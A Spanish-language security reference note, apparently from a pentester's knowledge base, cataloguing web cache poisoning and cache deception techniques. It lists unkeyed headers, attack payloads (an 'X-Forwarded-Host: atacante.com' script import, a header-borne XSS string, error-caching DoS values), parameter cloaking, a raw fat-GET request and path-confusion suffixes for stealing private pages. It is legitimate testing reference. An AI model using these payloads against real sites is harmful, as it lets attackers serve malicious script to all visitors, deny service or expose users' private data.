---
tipo: meta
aliases:
  - cabeceras sin clave
  - payloads de cache poisoning
  - path confusion
tags:
  - meta/referencia
  - dominio/web
---

# Web cache entradas sin clave - matriz de referencia

> [!info] Referencia pura, no un zettel
> El catálogo de entradas fuera de la clave, las discrepancias de normalización, y los sufijos de engaño. Cómo sondear está en [[Web cache - matriz de sondeo]]; el criterio, en [[MOC - Web cache]].

## 1. Cabeceras sin clave que suelen reflejarse

Se prueban con un canario y el cache buster puesto. Ver [[Web cache - envenenamiento por entrada sin clave]].

| Cabecera | Qué influye a menudo |
|---|---|
| `X-Forwarded-Host` | URLs absolutas, enlaces, redirecciones |
| `X-Forwarded-Scheme` / `X-Forwarded-Proto` | Redirección a `https`, URLs |
| `X-Host` | Igual que `X-Forwarded-Host` en algunos frameworks |
| `X-Forwarded-Server` | Nombre de host en la respuesta |
| `X-Original-URL` / `X-Rewrite-URL` | La ruta que procesa el back |
| `X-Forwarded-For` | A veces reflejada en errores o registros mostrados |
| `Forwarded` | La versión estándar de las `X-Forwarded-*` |
| `User-Agent` | Raro, pero influye en contenido adaptativo |
| `Accept-Language` | Contenido por idioma |
| `Cookie` (una cookie sin clave) | Contenido personalizado que no entra en la clave |

## 2. De cabecera reflejada a impacto

Según dónde caiga el reflejo:

| El reflejo arma | Payload | Resultado |
|---|---|---|
| Una etiqueta `<script src>` | `X-Forwarded-Host: atacante.com` | Importación de JS del atacante, servida a todos |
| Una redirección | `X-Forwarded-Host: atacante.com` | Redirección abierta masiva — [[CWE-601 - URL Redirection to Untrusted Site]] |
| Un atributo HTML sin escapar | `X-Forwarded-Host: "><script>alert(1)</script>` | XSS almacenado por caché — [[MOC - Cross-site scripting]] |
| Un enlace `<link href>` de CSS | host del atacante | Robo de estilos, a veces exfiltración |
| Un `<meta>` o `import` | host del atacante | Ejecución en el origen |

La severidad sale de cruzar la cabecera (columna 1 de § 1) con lo que refleja. Una `X-Forwarded-Host` que solo aparece en un enlace visible es baja; la misma en un `<script src>` es crítica.

## 3. Envenenamiento a denegación de servicio

Cuando no se puede reflejar un payload útil pero sí romper la respuesta:

`X-Forwarded-Host: ` con un valor gigante → respuesta de error cacheada
Cabecera que provoca `400`/`500` y **la caché guarda el error** → el recurso queda caído para todos
`X-Forwarded-Scheme: nothttps` → bucle de redirección cacheado

El "cache poisoning DoS" es real y a veces el único impacto alcanzable; se reporta como tal.

## 4. Manipulación de la clave — cloaking

Para [[Web cache - manipulación de la clave]]. Meter el payload en un parámetro que la caché excluye de la clave pero el servidor usa:

`?utm_source=x&payload_real=...` — si la caché ignora `utm_*`
`?param;excluido=payload` — delimitador `;` que una capa separa y la otra no
`?param,excluido=payload` — delimitador `,`
`?callback=x&__proto__[x]=y` — combinado con otra clase

La discrepancia de delimitador es la más productiva: la caché corta la query en un carácter y el servidor en otro, así que ven parámetros distintos.

## 5. Fat GET

El servidor lee el cuerpo de un `GET`; la caché no lo pone en la clave:

```
GET /?param=inocuo HTTP/1.1
Host: objetivo.com
Content-Length: 22

param=payload_real
```

Si el servidor prioriza el cuerpo sobre la query, la clave lleva `inocuo` y la respuesta lleva `payload_real`. Un `GET` con cuerpo es en sí la anomalía, igual que en [[Request smuggling - desincronización del cliente]].

## 6. Discrepancias de normalización

Dos parsers de la misma URL que no coinciden, mismo patrón que [[MOC - Request smuggling]]:

| Discrepancia | Abuso |
|---|---|
| La caché decodifica `%2f`, el servidor no | Rutas que la caché ve iguales y el servidor distintas |
| La caché ordena la query, el servidor toma el primero | Parámetro repetido con valores distintos |
| La caché recorta el fragmento `#`, el servidor lo usa | Payload tras `#` |
| Mayúsculas: la caché normaliza, el servidor distingue | `/Path` vs `/path` |
| Barra final: una la agrega, la otra no | Dos claves para el mismo recurso |

## 7. Confusión de ruta — para el engaño

Para [[Web cache - engaño de caché]]. Sufijos que la caché ve como estáticos y el servidor ignora, sobre una página privada `/cuenta/perfil`:

`/cuenta/perfil.css`
`/cuenta/perfil.js`
`/cuenta/perfil.jpg`
`/cuenta/perfil%00.css` — byte nulo
`/cuenta/perfil%0a.css` — salto de línea
`/cuenta/perfil;.css` — punto y coma
`/cuenta/perfil?.css` — signo de pregunta
`/cuenta/perfil#.css` — fragmento
`/cuenta/perfil%23.css` — fragmento codificado
`/cuenta/perfil/..%2f..%2fperfil.css` — recorrido que vuelve
`/cuenta/perfil/extra.css` — segmento de más que la app ignora

Cada par caché/servidor cae con un subconjunto distinto. Se prueban en orden contra la propia cuenta.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| Ninguna cabecera de § 1 se refleja | No hay entrada sin clave reflejada. Probar cloaking (§ 4) y fat GET (§ 5) |
| Se refleja pero queda en la clave | Sacarla con cloaking, § 4 |
| El delimitador no separa distinto | Ese par no discrepa ahí. Probar otro delimitador |
| El fat GET no toma el cuerpo | El servidor ignora el cuerpo del `GET`. Rama cerrada |
| El sufijo de engaño da `404` | El servidor no ignora ese sufijo. Probar otro de § 7 |
| El engaño no cachea | La caché mira `Content-Type`. Buscar un recurso realmente servido como estático |

## Relacionadas

[[MOC - Web cache]] · [[Web cache - matriz de sondeo]] · [[Web cache - envenenamiento por entrada sin clave]] · [[Web cache - engaño de caché]]
